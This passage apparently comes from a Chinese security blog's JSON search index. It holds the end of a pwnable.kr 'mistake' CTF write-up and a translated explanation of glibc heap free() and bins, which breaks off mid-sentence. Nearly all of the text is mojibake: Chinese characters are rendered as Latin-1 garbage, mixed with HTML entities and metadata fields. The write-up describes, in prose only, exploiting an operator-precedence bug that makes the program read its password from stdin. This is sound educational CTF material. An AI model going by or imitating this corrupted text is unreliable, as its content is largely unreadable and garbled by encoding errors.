æ•´ä¸ªç¨‹åºçš„æ‰§è¡Œé€»è¾‘ä¸ºï¼Œæ‰“å¼€ç³»ç»Ÿç›®å½•ä¸‹ä¿å­˜å¯†ç çš„æ–‡ä»¶ï¼Œä¹‹åå¼€è¾Ÿäº†ä¸€ä¸ªæ•°ç»„è¯»å–è¯¥å¯†ç æ–‡ä»¶ä¸­çš„å¯†ç å¹¶ä¿å­˜ï¼Œä¹‹åç”±ç”¨æˆ·è¾“å…¥10å­—èŠ‚é•¿çš„å¯†ç ï¼Œå­˜æ”¾åˆ°ä¸€ä¸ªæ–°çš„æ•°ç»„ä¸­ï¼Œå°†ç”¨æˆ·è¾“å…¥çš„å¯†ç è¿›è¡Œä¸$0x1$è¿›è¡Œå¼‚æˆ–ï¼ˆæŒ‰ä½å–åï¼‰æ“ä½œï¼Œä¹‹åå°†ä¸¤ä¸ªæ•°ç»„çš„å†…å®¹è¿›è¡Œæ¯”è¾ƒï¼Œå¦‚æœæ•°ç»„ä¸­çš„å†…å®¹ç›¸åŒï¼Œåˆ™éªŒè¯é€šè¿‡ï¼Œå¯æ‰§è¡Œsystemå‡½æ•°æ‹¿åˆ°flagã€‚ æ€è·¯åˆ†ææœ€è‡ªç„¶çš„æƒ³æ³•æ˜¯ç›´æ¥çˆ†ç ´10ä½ç”¨æˆ·çš„å¯†ç ï¼Œä½†ä»£ç ä¸­æ‰“å°â€œdo not bruteforceâ€ï¼Œå¹¶ä¸”åœ¨é¢˜ç›®ä¸­æç¤ºoperator priorityï¼Œå› æ­¤å®¡æŸ¥æºä»£ç ä¸­å­˜åœ¨ä¸¤ä¸ªè¿ç®—ç¬¦ä»¥ä¸Šçš„è¯­å¥ï¼š è¿™é‡Œ$&lt;$è¿ç®—ç¬¦çš„ä¼˜å…ˆçº§é«˜äº$=$è¿ç®—ç¬¦ï¼Œå› æ­¤å®é™…ä¸Šfdæœ€ç»ˆå¹¶ä¸æ˜¯ç†æƒ³çš„æ–‡ä»¶æè¿°ç¬¦ï¼Œè€Œæ˜¯0æ‰å¯¹ã€‚è¿™é‡Œçš„æ­£ç¡®å†™æ³•å¦‚ä¸‹ï¼š 1if((fd=open(&quot;/home/mistake/password&quot;,O_RDONLY,0400)) &lt; 0) è€Œå¦ä¸€æ–¹é¢ï¼Œ0ä½œä¸ºæ–‡ä»¶æè¿°ç¬¦ï¼Œå®ƒæŒ‡å‘çš„æ˜¯stdinã€‚ å› æ­¤ï¼Œåé¢çš„readå‡½æ•°å®é™…ä¸Šæ˜¯ä»stdinè¯»å–ï¼Œè€Œä¸æ˜¯passwordæ–‡ä»¶ï¼Œè€Œstdinæˆ‘ä»¬å¯ä»¥æ§åˆ¶ï¼Œåˆ™æˆ‘ä»¬å¯ä»¥è¾“å…¥ä»»æ„å·²çŸ¥çš„å¯†ç ï¼Œä¹‹åå†è¾“å…¥ä¸$0x1$å¼‚æˆ–çš„å€¼ï¼Œä½¿å¾—ä¸¤æ¬¡è¾“å…¥çš„å¯†ç ç›¸åŒ¹é…ã€‚ PWN","categories":[{"name":"PWN","slug":"PWN","permalink":"https://github.com/xiaohong404/xiaohong404.github.io/Categories/PWN/"},{"name":"Pwnable.kr","slug":"PWN/Pwnable-kr","permalink":"https://github.com/xiaohong404/xiaohong404.github.io/Categories/PWN/Pwnable-kr/"},{"name":"Toddler's Bottle","slug":"PWN/Pwnable-kr/Toddler-s-Bottle","permalink":"https://github.com/xiaohong404/xiaohong404.github.io/Categories/PWN/Pwnable-kr/Toddler-s-Bottle/"}],"tags":[{"name":"PWN","slug":"PWN","permalink":"https://github.com/xiaohong404/xiaohong404.github.io/tags/PWN/"}]},{"title":"Heap II","slug":"Heap/Heap-II","date":"2020-10-17T13:32:43.000Z","updated":"2020-10-19T07:10:32.000Z","comments":true,"path":"2020/10/17/Heap/Heap-II/","link":"","permalink":"https://github.com/xiaohong404/xiaohong404.github.io/2020/10/17/Heap/Heap-II/","excerpt":"","text":"[åŸç‰ˆä¼ é€é—¨] UNDERSTANDING THE GLIBC HEAP IMPLEMENTATIONå‰ä¸€éƒ¨åˆ†è§£é‡Šäº†mallocå’Œfreeçš„åŸºæœ¬è¡Œä¸ºã€‚æˆ‘ä»¬çœ‹åˆ°ï¼Œmallocé€šè¿‡åˆ†é…å†…å­˜å—æ¥å¤„ç†å†…å­˜åˆ†é…è¯·æ±‚ã€‚æ¯ä¸ªå—ä¸ä»…å­˜å‚¨ç¨‹åºå‘˜å°†ä¸ä¹‹äº¤äº’çš„mallocè¿”å›çš„â€œç”¨æˆ·æ•°æ®â€åŒºåŸŸï¼Œè¿˜å­˜å‚¨ä¸è¯¥å—å…³è”çš„å…ƒæ•°æ®ã€‚ æˆ‘ä»¬çœ‹åˆ°äº†å †ç®¡ç†å™¨çš„åŸºæœ¬å—åˆ†é…ç­–ç•¥æ˜¯å¦‚ä½•å·¥ä½œçš„ï¼Œå¹¶ä¸”çœ‹åˆ°äº†å½“æ²¡æœ‰å·²ç»é‡Šæ”¾çš„å—å¯ä»¥è¢«ç”¨äºå“åº”ç”¨æˆ·çš„è¯·æ±‚æ—¶ï¼Œå¦‚ä½•ä»å †çš„é¡¶éƒ¨åˆ›å»ºæ–°å—ã€‚ æ¥ä¸‹æ¥è¿™ç¯‡æ–‡ç« ï¼Œå°†è§£é‡Šè¿™ç§å—å›æ”¶ç­–ç•¥æ˜¯å¦‚ä½•å·¥ä½œçš„ï¼Œå³å¦‚ä½•å°†å·²ç»åˆ†é…çš„å—è¢«freeç„¶åä¿å­˜èµ·æ¥ï¼Œå¹¶æœ€ç»ˆå›æ”¶ä»¥æœåŠ¡ä¹‹åçš„mallocè¯·æ±‚ã€‚è®¸å¤šå †åˆ©ç”¨æŠ€æœ¯éƒ½ä¾èµ–äºè¿™äº›å†…éƒ¨æœºåˆ¶ï¼Œä½†æ˜¯ç°åœ¨ï¼Œè®©æˆ‘ä»¬çœ‹çœ‹å †æ­£ç¡®è¿è¡Œæ—¶å¦‚ä½•é€šè¿‡freeå›æ”¶è¿™äº›å—ã€‚ HOW DOES FREE WORK?å½“ç¨‹åºå‘˜å®Œæˆmallocçš„åˆ†é…å—çš„ä»»åŠ¡ï¼ˆæˆ–mallocå…¼å®¹çš„åˆ†é…ï¼Œå¦‚callocï¼‰åï¼Œç¨‹åºå‘˜å°†é€šè¿‡freeå°†å…¶é‡Šæ”¾å›å †ç®¡ç†å™¨ã€‚åœ¨Cæ ‡å‡†å®šä¹‰äº†freeï¼ˆNULLï¼‰ä»€ä¹ˆä¹Ÿä¸åšï¼Œä½†å¯¹äºæ‰€æœ‰å…¶ä»–freeè°ƒç”¨ï¼Œå †ç®¡ç†å™¨çš„ç¬¬ä¸€ä»½å·¥ä½œæ˜¯ä½¿æŒ‡é’ˆæŒ‡å›å…¶ç›¸åº”çš„å—ã€‚å †ç®¡ç†å™¨é€šè¿‡ä»ä¼ é€’ç»™freeçš„æŒ‡é’ˆä¸­å‡å»è¯¥å—å…ƒæ•°æ®çš„å¤§å°æ¥å®ç°æ­¤ç›®çš„ã€‚ ä»æŒ‡é’ˆåˆ°å—çš„è¿™ç§è½¬æ¢ä¹‹æ‰€ä»¥æœ‰æ•ˆï¼Œæ˜¯å› ä¸ºç”¨æˆ·æ•°æ®åŒºåŸŸä½äºå—å†…ï¼Œä½†æ˜¯ï¼Œä»…å½“ä¼ é€’ç»™freeçš„æŒ‡é’ˆç¡®å®æ¥è‡ªmallocçš„å®æ—¶åˆ†é…æ—¶ï¼Œè¯¥è½¬æ¢æ‰æœ‰æ•ˆã€‚å¦‚æœå°†å…¶ä»–ä¸€äº›æŒ‡é’ˆä¼ é€’ç»™freeï¼Œåˆ™å †ç®¡ç†å™¨å¯èƒ½é‡Šæ”¾æˆ–å›æ”¶æ— æ•ˆçš„å—ï¼Œä»è€Œå¯¼è‡´å†…å­˜æŸåé—®é¢˜ï¼Œè¿™å¯èƒ½å¯¼è‡´è¿›ç¨‹å´©æºƒï¼Œç”šè‡³å¯èƒ½ä½¿é»‘å®¢è¿œç¨‹æ¥ç®¡è¯¥è¿›ç¨‹ã€‚ å› æ­¤ï¼Œfreeé¦–å…ˆè¿›è¡Œäº†ä¸€äº›åŸºæœ¬çš„æ£€æŸ¥ï¼Œæ£€æŸ¥æ˜¯å¦è¿™ä¸ªé‡Šæ”¾çš„å—æ˜¯æ˜¾ç„¶æ— æ•ˆçš„ï¼Œé˜²æ­¢ä¹‹åå†åˆ†é…ã€‚å¦‚æœå…¶ä¸­ä»»ä½•ä¸€ä¸ªæ£€æŸ¥å¤±è´¥ï¼Œåˆ™ç¨‹åºä¸­æ­¢ã€‚æ£€æŸ¥åŒ…æ‹¬ï¼š æ£€æŸ¥åˆ†é…æ˜¯å¦åœ¨8å­—èŠ‚ï¼ˆæˆ–64ä½ä¸º16å­—èŠ‚ï¼‰è¾¹ç•Œä¸Šå¯¹é½ï¼Œå› ä¸ºmallocç¡®ä¿æ‰€æœ‰åˆ†é…éƒ½å¯¹é½ã€‚ æ£€æŸ¥å—çš„å¤§å°å­—æ®µæ˜¯å¦å¯èƒ½ï¼Œå› ä¸ºå®ƒå¯èƒ½å¤ªå°ï¼Œå¤ªå¤§ï¼Œæˆ–è€…æ²¡æœ‰å¯¹é½å­—èŠ‚ï¼Œè¿˜æ˜¯å› ä¸ºå®ƒä¸è¿›ç¨‹åœ°å€ç©ºé—´çš„æœ«å°¾é‡å ã€‚ æ£€æŸ¥å—ä½äºarenaçš„è¾¹ç•Œå†…ã€‚ é€šè¿‡æ£€æŸ¥ä½äºä¸‹ä¸€ä¸ªå—å¼€å¤´çš„å…ƒæ•°æ®ä¸­çš„ç›¸åº”â€œ Pâ€ä½ï¼Œæ£€æŸ¥è¯¥å—æ˜¯å¦å°šæœªæ ‡è®°ä¸ºç©ºé—²ã€‚ è¿™é‡Œçš„å †ç®¡ç†å™¨æ£€æŸ¥å¹¶ä¸è¯¦å°½ã€‚æ”»å‡»è€…æ§åˆ¶çš„æŒ‡å‘æ•°æ®çš„æŒ‡é’ˆå¯èƒ½ä¼šç»•è¿‡è¿™äº›å®Œæ•´æ€§æ£€æŸ¥ï¼Œå¹¶ä¸”ä»ä¼šåœ¨è¿›ç¨‹ä¸­è§¦å‘å†…å­˜å´©æºƒã€‚æˆ‘ä»¬å°†åœ¨ä»¥åçš„æ–‡ç« ä¸­æ›´è¯¦ç»†åœ°ä»‹ç»è¿™ä¸€ç‚¹ã€‚ FREE CHUNK METADATAåœ¨ä¸Šä¸€ç¯‡æ–‡ç« ä¸­ï¼Œå±•ç¤ºäº†å·²åˆ†é…å—å¦‚ä½•å°†å…ƒæ•°æ®ä¸ç¨‹åºå‘˜ä½¿ç”¨çš„â€œç”¨æˆ·æ•°æ®â€åŒºåŸŸä¸€èµ·å­˜å‚¨ã€‚è¿™äº›å·²ç»åˆ†é…çš„å—å­˜å‚¨äº†â€œå—å¤§å°â€ä»¥åŠå…¶å…ƒæ•°æ®ä¸­çš„ä¸‰ä¸ªä½ï¼Œåˆ†åˆ«ç§°ä¸ºâ€œ Aâ€ï¼Œâ€œ Mâ€å’Œâ€œ Pâ€ã€‚è¿™äº›ä½å¯åˆ†åˆ«å¸®åŠ©å †ç®¡ç†å™¨è®°ä½è¯¥å—æ˜¯å¦æ˜¯ä»éä¸»arenaåˆ†é…çš„ï¼Œæ˜¯å¦æ˜¯é€šè¿‡mmapè¿›è¡Œå †å¤–åˆ†é…çš„ï¼Œä»¥åŠå‰ä¸€ä¸ªå—æ˜¯å¦æ˜¯ç©ºé—²çš„ã€‚ ç©ºé—²å—ä¹Ÿå­˜å‚¨å…ƒæ•°æ®ã€‚ç±»ä¼¼å·²åˆ†é…çš„å—ï¼Œä»–ä»¬å­˜å‚¨â€œå—å¤§å°â€ï¼Œâ€œAâ€å’Œâ€œPâ€å­—æ®µï¼Œä½†ä»–ä»¬ä¸ä½¿ç”¨â€œMâ€å­—æ®µï¼Œå› ä¸ºä¸€ä¸ªMMAPè¿‡çš„å—åœ¨é‡Šæ”¾æœŸé—´å°†æ°¸è¿œæ˜¯munmap-edï¼ˆå–æ¶ˆè™šæ‹Ÿå†…å­˜æ˜ å°„ï¼‰ï¼Œè€Œä¸æ˜¯è½¬å˜æˆä¸€ä¸ªfreeå—å›æ”¶ï¼Œå³ç©ºé—²å—çš„â€Mâ€œå­—æ®µæ˜¯ä¸€ä¸ªç¡®å®šçš„å€¼ï¼Œä¸€å®šä¸ä¼šé€šè¿‡mmapä»å †å¤–åˆ†é…ã€‚ ç©ºé—²å—è¿˜ä½¿ç”¨ç§°ä¸ºâ€œè¾¹ç•Œæ ‡ç­¾â€çš„æŠ€æœ¯åœ¨ç”¨æˆ·æ•°æ®åŒºåŸŸä¹‹åå­˜å‚¨ä¿¡æ¯ã€‚è¿™äº›è¾¹ç•Œæ ‡ç­¾åœ¨å—ä¹‹å‰å’Œä¹‹åæºå¸¦å¤§å°ä¿¡æ¯ã€‚è¿™å…è®¸ä»ä»»ä½•å·²çŸ¥çš„å—å¼€å§‹å¹¶åœ¨ä»»ä½•æ–¹å‘ä¸Šéå†å—ï¼Œä»è€Œèƒ½å¤Ÿéå¸¸å¿«é€Ÿåœ°åˆå¹¶ç›¸é‚»çš„ç©ºé—²å—ã€‚ è¿™äº›é‡Šæ”¾çš„å—å­˜å‚¨åœ¨ç›¸åº”çš„â€free binsâ€œä¸­ï¼Œè¿™äº›â€œfree binsâ€ç”¨ä½œé“¾è¡¨ã€‚è¿™è¦æ±‚æ¯ä¸ªç©ºé—²å—è¿˜å­˜å‚¨æŒ‡å‘å…¶ä»–å—çš„æŒ‡é’ˆã€‚ç”±äºé‡Šæ”¾çš„å—ä¸­çš„â€œç”¨æˆ·æ•°æ®â€ï¼ˆæ ¹æ®å®šä¹‰ï¼‰æ˜¯å…è´¹ä¾›å †ç®¡ç†å™¨ä½¿ç”¨çš„ï¼Œå› æ­¤å †ç®¡ç†å™¨å°†é‡Šæ”¾çš„å—ä¸­çš„â€œç”¨æˆ·æ•°æ®â€åŒºåŸŸé‡æ–°å®šä½ä¸ºé¢å¤–çš„å…ƒæ•°æ®æ‰€åœ¨çš„ä½ç½®ã€‚ RECYCLING MEMORY WITH BINSåœ¨å†…éƒ¨ï¼Œå †ç®¡ç†å™¨éœ€è¦è®°å½•é‡Šæ”¾çš„å—ï¼Œä»¥ä¾¿mallocå¯ä»¥åœ¨åˆ†é…è¯·æ±‚æœŸé—´é‡ç”¨å®ƒä»¬ã€‚åœ¨æœ€åˆçš„å®ç°ä¸­ï¼Œå †ç®¡ç†å™¨å¯ä»¥é€šè¿‡å°†æ‰€æœ‰é‡Šæ”¾çš„å—ç®€å•åœ°å­˜å‚¨åœ¨æŸä¸ªå·¨å¤§çš„é“¾è¡¨ä¸­æ¥å®Œæˆæ­¤æ“ä½œã€‚è¿™å¯ä»¥å·¥ä½œï¼Œä½†æ˜¯ä¼šä½¿mallocå˜æ…¢ã€‚ç”±äºmallocæ˜¯å¤§å¤šæ•°ç¨‹åºçš„é«˜åˆ©ç”¨ç‡ç»„ä»¶ï¼Œå› æ­¤è¿™ç§ç¼“æ…¢å°†å¯¹ç³»ç»Ÿä¸Šè¿è¡Œçš„ç¨‹åºçš„æ•´ä½“æ€§èƒ½äº§ç”Ÿå·¨å¤§å½±å“ã€‚ ä¸ºäº†æé«˜æ€§èƒ½ï¼Œå †ç®¡ç†å™¨è€Œæ˜¯ç»´æŠ¤ä¸€ç³»åˆ—ç§°ä¸ºâ€œ binsâ€çš„åˆ—è¡¨ï¼Œè¿™äº›åˆ—è¡¨æ—¨åœ¨æœ€å¤§ç¨‹åº¦åœ°æé«˜åˆ†é…å’Œé‡Šæ”¾çš„é€Ÿåº¦ã€‚å…±æœ‰5ç§ç±»å‹binsï¼šæ¯ä¸ªçº¿ç¨‹62 small bins, 63 large bins, 1 unsorted bin, 10 fast bins and 64 tcache bins ã€‚ smallï¼Œlargeï¼Œunsorted binsæ˜¯æœ€å¤è€çš„binç±»å‹ï¼Œå…¶å®ç°è¿™é‡Œå°†å…¶ç§°ä¸ºå †çš„åŸºæœ¬å›æ”¶ç­–ç•¥ã€‚fast binså’Œtcache binsæ˜¯åœ¨è¿™äº›åŸºç¡€ä¸Šçš„ä¼˜åŒ–ã€‚ å®¹æ˜“æ··æ·†çš„åœ°æ–¹åœ¨äºï¼Œåœ¨å †ç®¡ç†å™¨çš„æºä»£ç ä¸­ï¼Œsmallï¼Œlargeï¼Œunsorted binséƒ½ä¸€èµ·å­˜åœ¨åŒä¸€æ•°ç»„ä¸­ã€‚ç´¢å¼•0æ²¡æœ‰è¢«ä½¿ç”¨ï¼Œç´¢å¼•1æ˜¯unsorted binï¼Œ2-64æ˜¯small binsï¼Œ65-127æ˜¯large binsã€‚ CHUNK RECYCLING: THE BASIC STRATEGYåœ¨tcacheå’Œfastbinä¼˜åŒ–ä¹‹å‰ï¼Œé¦–å…ˆæ¥çœ‹ä¸€ä¸‹å †ç®¡ç†å™¨ä½¿ç”¨çš„åŸºæœ¬å›æ”¶ç­–ç•¥ã€‚ freeçš„åŸºæœ¬ç®—æ³•å¦‚ä¸‹ï¼ˆä½åœ°å€åœ¨å‰ï¼Œé«˜åœ°å€åœ¨åï¼‰ï¼š å¦‚æœå—åœ¨å…ƒæ•°æ®ä¸­è®¾ç½®äº†Mä½ï¼Œåˆ™åˆ†é…æ˜¯åœ¨å †å¤–åˆ†é…çš„ï¼Œåˆ™åº”è¯¥è¢«munmapã€‚ å¦åˆ™ï¼Œå¦‚æœè¯¥å—ä¹‹å‰çš„å—æ˜¯ç©ºé—²çš„ï¼Œåˆ™å°†ä¹‹å‰çš„å—å‘ååˆå¹¶ä»¥åˆ›å»ºæ›´å¤§çš„ç©ºé—²å—ã€‚ åŒæ ·ï¼Œå¦‚æœæ­¤å—ä¹‹åçš„å—æ˜¯ç©ºé—²çš„ï¼Œåˆ™å°†ä¹‹åçš„å—å°†å‘å‰åˆå¹¶ä»¥åˆ›å»ºæ›´å¤§çš„ç©ºé—²å—ã€‚ å¦‚æœè¿™ä¸ªä¹‹åå¯èƒ½æ›´å¤§çš„å—ä¸å †çš„â€œé¡¶éƒ¨â€ç›¸é‚»ï¼Œåˆ™æ•´ä¸ªå—å°†è¢«å­˜å‚¨åˆ°å †çš„æœ«ç«¯ï¼Œè€Œä¸æ˜¯å­˜å‚¨åœ¨â€œ binâ€ä¸­ã€‚ å¦åˆ™ï¼Œè¯¥å—å°†è¢«æ ‡è®°ä¸ºç©ºé—²å¹¶å°†å…¶æ”¾ç½®åœ¨é€‚å½“çš„binä¸­ã€‚ SMALL BINSsmall binsæ˜¯æœ€å®¹æ˜“ç†è§£çš„åŸºæœ¬binã€‚å®ƒä»¬æœ‰62ä¸ªï¼Œæ¯ä¸ªsmall binéƒ½å­˜å‚¨ç›¸åŒå¤§å°çš„å›ºå®šå—ã€‚åœ¨32ä½ç³»ç»Ÿä¸Šå°äº512å­—èŠ‚ï¼ˆåœ¨64ä½ç³»ç»Ÿä¸Šå°äº1024å­—èŠ‚ï¼‰çš„æ¯ä¸ªå—éƒ½æœ‰ä¸€ä¸ªå¯¹åº”çš„small binã€‚ç”±äºæ¯ä¸ªsmall binä»…å­˜å‚¨ä¸€ä¸ªç‰¹å®šå¤§å°çš„å—ï¼Œå®ƒä»¬ä¼šè‡ªåŠ¨æ’åºï¼Œå› æ­¤åœ¨è¿™äº›åˆ—è¡¨ä¸­æ’å…¥å’Œåˆ é™¤æ¡ç›®çš„é€Ÿåº¦éå¸¸å¿«ã€‚ LARGE BINSsmall binsçš„ç­–ç•¥éå¸¸é€‚åˆå°å‹åˆ†é…ï¼Œä½†æ˜¯æˆ‘ä»¬æ— æ³•ä¸ºæ¯ä¸ªå¯èƒ½çš„å—å¤§å°éƒ½è®¾ç½®ä¸€ä¸ªå­˜å‚¨åŒºã€‚å¯¹äºè¶…è¿‡512å­—èŠ‚ï¼ˆ64ä½ä¸º1024å­—èŠ‚ï¼‰çš„å—ï¼Œå †ç®¡ç†å™¨å°†æ”¹ä¸ºä½¿ç”¨large binsã€‚ 63ä¸ªlarge binsä¸­çš„æ¯ä¸ªå¤§éƒ½ä¸small binsä»¥ç›¸åŒçš„æ–¹å¼è¿è¡Œï¼Œä½†æ˜¯å®ƒä»¬ä¸æ˜¯å­˜å‚¨å›ºå®šå¤§å°çš„å—ï¼Œè€Œæ˜¯å­˜å‚¨ä¸€å®šå¤§å°èŒƒå›´å†…çš„å—ã€‚æ¯ä¸ªlarge binsçš„å¤§å°èŒƒå›´éƒ½è®¾è®¡ä¸ºä¸small binsçš„å—å¤§å°æˆ–å…¶ä»–large binsçš„èŒƒå›´ä¸é‡å ã€‚æ¢å¥è¯è¯´ï¼Œåœ¨ç»™å®šå—çš„å¤§å°çš„æƒ…å†µä¸‹ï¼Œæ°å¥½åªæœ‰ä¸€ä¸ªå¯¹åº”äºæ­¤å¤§å°çš„small binæˆ–large binã€‚ ç”±äºlarge binså­˜å‚¨ä¸€å®šå¤§å°èŒƒå›´çš„å—ï¼Œå› æ­¤å‘large binä¸­æ’å…¥ä¸€ä¸ªå—å¿…é¡»æ‰‹åŠ¨è¿›è¡Œæ’åºï¼Œå¹¶ä¸”ä»é“¾è¡¨ä¸­çš„åˆ†é…ä¹Ÿéœ€è¦éå†è¯¥åˆ—è¡¨ã€‚è¿™ä½¿å¾—large binsæœ¬è´¨ä¸Šæ¯”small binsæ…¢ã€‚ä½†æ˜¯ï¼Œåœ¨å¤§å¤šæ•°ç¨‹åºä¸­ï¼Œlarge binsçš„ä½¿ç”¨é¢‘ç‡è¾ƒä½ã€‚è¿™æ˜¯å› ä¸ºå¹³å‡æ„ä¹‰ä¸Šè¯´ï¼Œç¨‹åºæ›´å€¾å‘äºä»¥æ›´é«˜çš„é¢‘ç‡åˆ†é…ï¼ˆæˆ–é‡Šæ”¾ï¼‰å°çš„åˆ†é…å—ã€‚å‡ºäºç›¸åŒçš„åŸå› ï¼Œlarge binsçš„ä½¿ç”¨é¢‘ç‡ä¼šèšé›†åœ¨è¦†ç›–èŒƒå›´è¾ƒå°çš„large binä¸­ï¼›æœ€å°çš„large binä»…è¦†ç›–ä»512å­—èŠ‚åˆ°576å­—èŠ‚çš„64å­—èŠ‚èŒƒå›´çš„å—ï¼Œè€Œç¬¬äºŒå¤§çš„large binåˆ™è¦†ç›–256KBçš„å¤§å°èŒƒå›´çš„å—ã€‚æœ€å¤§çš„large binè¦†ç›–äº†1MBä»¥ä¸Šçš„æ‰€æœ‰å·²é‡Šæ”¾å—ã€‚ UNSORTED BINå †ç®¡ç†å™¨ä½¿ç”¨ç§°ä¸ºunsorted binsçš„ä¼˜åŒ–ç¼“å­˜å±‚é¢è¿›ä¸€æ­¥æ”¹å–„äº†åŸºæœ¬çš„åˆ†é…ç®—æ³•ã€‚æ­¤ä¼˜åŒ–åŸºäºä»¥ä¸‹è§‚å¯Ÿç»“æœï¼šé€šå¸¸è¿™äº›freeçš„å—éƒ½èšé›†åœ¨ä¸€èµ·ï¼Œå¹¶ä¸”é‡Šæ”¾åé€šå¸¸ç«‹å³åˆ†é…å¤§å°ç›¸ä¼¼çš„å—ã€‚ä¾‹å¦‚ï¼Œé‡Šæ”¾æ ‘æˆ–åˆ—è¡¨çš„ç¨‹åºé€šå¸¸ä¼šä¸€æ¬¡é‡Šæ”¾å¤§å¤šæ•°åˆ†é…ç©ºé—´ä¸­çš„æ‰€æœ‰æ¡ç›®ï¼Œæˆ–è€…æ›´æ–°åˆ—è¡¨ä¸­æ¡ç›®çš„ç¨‹åºå¯èƒ½ä¼šé‡Šæ”¾å‰ä¸€ä¸ªæ¡ç›®ï¼Œç„¶åå†åˆ†é…æ–°çš„ç©ºé—´æ›¿æ¢æ¡ç›®ã€‚ åœ¨è¿™äº›æƒ…å†µä¸‹ï¼Œåœ¨å°†è¾ƒå¤§çš„å—æ”¾å…¥æ­£ç¡®çš„binä¸­ä¹‹å‰åˆå¹¶è¿™äº›é‡Šæ”¾çš„å—å°†é¿å…ä¸€äº›å¼€é”€ï¼Œå¹¶ä¸”åœ¨åˆ†é…è¿‡ç¨‹ä¸­èƒ½å¤Ÿå¿«é€Ÿè¿”å›æœ€è¿‘é‡Šæ”¾çš„å—å°†ç®€å•åœ°åŠ å¿«æ•´ä¸ªè¿‡ç¨‹ã€‚ å› æ­¤å †ç®¡ç†å™¨å¼•å…¥äº†unsorted binï¼Œå½“ä¸€ä¸ªå—é‡Šæ”¾æ—¶ï¼Œå †ç®¡ç†å™¨æ²¡æœ‰ç«‹å³å°†æ–°é‡Šæ”¾çš„å—æ”¾å…¥ç›¸åº”çš„binä¸­ï¼Œè€Œæ˜¯ä¸ç›¸é‚»çš„å—åˆå¹¶ï¼Œç„¶åå°†å…¶è½¬å‚¨åˆ°å¸¸è§„çš„unsortedçš„é“¾è¡¨ä¸­ã€‚åœ¨mallocæœŸé—´ï¼Œå°†æ£€æŸ¥unsorted binsä¸Šçš„æ¯ä¸ªé¡¹ç›®ï¼Œä»¥æŸ¥çœ‹å…¶æ˜¯å¦â€œé€‚åˆâ€œè¯·æ±‚ã€‚å¦‚æœå¤§å°åŒ¹é…ï¼Œmallocå¯ä»¥ç«‹å³ä½¿ç”¨å®ƒã€‚å¦‚æœæ²¡æœ‰åŒ¹é…çš„å—ï¼Œåˆ™mallocä¹‹åä¼šå°†å—æ”¾å…¥å…¶ç›¸åº”çš„small binsæˆ–large binsä¸­ã€‚ FAST BINSfast binsæ˜¯åœ¨ä¹‹å‰çœ‹åˆ°çš„ä¸‰ä¸ªåŸºæœ¬binåŸºç¡€ä¸Šçš„è¿›ä¸€æ­¥ä¼˜åŒ–ã€‚è¿™äº›binså®é™…ä¸Šå°†æœ€è¿‘é‡Šæ”¾çš„å°å—ä¿ç•™åœ¨â€œfast-turnaround queueâ€ä¸­ï¼Œå¹¶ä¸”åœ¨å—è¢«é‡Šæ”¾ä¹‹åä¸å°†å…¶ä¸ç›¸é‚»çš„å—åˆå¹¶ï¼Œä½¿å¾—è¿™äº›å—å§‹ç»ˆä¿æŒæ´»è·ƒçŠ¶æ€ï¼Œä»¥ä¾¿åœ¨é‡Šæ”¾åä¸ä¹…è‹¥æœ‰åŒ¹é…è¯¥å—å¤§å°çš„mallocè¯·æ±‚ï¼Œå¯ä»¥ç«‹å³é‡æ–°åˆ©ç”¨è¯¥å—ã€‚ åƒsmall binsä¸€æ ·ï¼Œæ¯ä¸ªfast binsä»…è´Ÿè´£å•ä¸ªå›ºå®šå¤§å°çš„å—ã€‚æœ‰10ä¸ªè¿™æ ·çš„fast binsï¼Œè¦†ç›–å¤§å°ä¸º16ã€24ã€32ã€40ã€48ã€56ã€64ã€72ã€80å’Œ88å­—èŠ‚çš„å—ä»¥åŠå—å…ƒæ•°æ®ã€‚ ä¸small binsä¸åŒï¼Œfast binsçš„å—æ°¸è¿œä¸ä¼šä¸ç›¸é‚»çš„å—åˆå¹¶ã€‚å®é™…ä¸Šï¼Œè¿™æ˜¯å †ç®¡ç†å™¨ä¸ä¼šåœ¨ä¸‹ä¸€ä¸ªå—çš„å¼€å¤´è®¾ç½®â€œ Pâ€ä½çš„æ–¹å¼ã€‚æ¢å¥è¯è¯´ï¼Œåœ¨æ¦‚å¿µä¸Šå¯ä»¥è®¤ä¸ºï¼Œå †ç®¡ç†å™¨ä¸ä¼šâ€œçœŸæ­£â€é‡Šæ”¾fast binsä¸­çš„å—ã€‚ å’Œsmall binsç›¸åŒçš„éƒ¨åˆ†åœ¨äºï¼Œfast binsä¹Ÿä»…è¦†ç›–å›ºå®šçš„å¤§å°çš„å—ï¼Œå¹¶ä¸”ä¼šè‡ªåŠ¨æ’åºåˆ†ç±»ï¼Œå› æ­¤æ’å…¥å’Œåˆ é™¤çš„é€Ÿåº¦ä¹Ÿéå¸¸å¿«ã€‚è€Œä¸”ï¼Œç”±äºfast-binnedçš„å—æ°¸è¿œä¸ä¼šåˆå¹¶ï¼Œå› æ­¤å®ƒä»¬åªéœ€è¦è¢«å­˜å‚¨åœ¨å•é“¾è¡¨ï¼Œè€Œä¸éœ€è¦å­˜å‚¨åœ¨åŒå‘é“¾è¡¨ä¸­ï¼Œå› ä¸ºå…¶ä¸å­˜åœ¨åˆå¹¶å—æ—¶ä»åˆ—è¡¨ä¸­è¿›è¡Œåˆ é™¤çš„æ“ä½œã€‚ å½“ç„¶ï¼Œfast binçš„ç¼ºç‚¹æ˜¯ï¼Œfast binå—ä¸ä¼šâ€œçœŸæ­£â€é‡Šæ”¾æˆ–åˆå¹¶ï¼Œæœ€ç»ˆä¼šå¯¼è‡´è¿›ç¨‹çš„å†…å­˜ç©ºé—´éšç€æ—¶é—´çš„æµé€è€Œç¢ç‰‡åŒ–å’Œè†¨èƒ€ã€‚ä¸ºäº†è§£å†³è¿™ä¸ªé—®é¢˜ï¼Œå †ç®¡ç†å™¨ä¼šå®šæœŸâ€œåˆå¹¶â€å †ã€‚é€šè¿‡â€œå®é™…é‡Šæ”¾â€å®ƒï¼ˆå³å°†å…¶ä¸ç›¸é‚»çš„ç©ºé—²å—åˆå¹¶ï¼‰ï¼Œå¹¶å°†ç”Ÿæˆçš„ç©ºé—²å—æ”¾ç½®åˆ°unsorted binsä¸Šï¼Œä»¥ä¾›mallocä¹‹åä½¿ç”¨ï¼Œä»è€Œâ€œåˆ·æ–°â€fast binsä¸­çš„æ¯ä¸ªæ¡ç›®ã€‚ æ¯å½“é‡Šæ”¾ä»»ä½•å¤§äº64KBçš„å—ï¼ˆå…¶ä¸­64KBä¸ºè¿‘ä¼¼å€¼ ï¼‰ï¼Œæˆ–ç”¨æˆ·å‘å‡ºå¤§äºfast 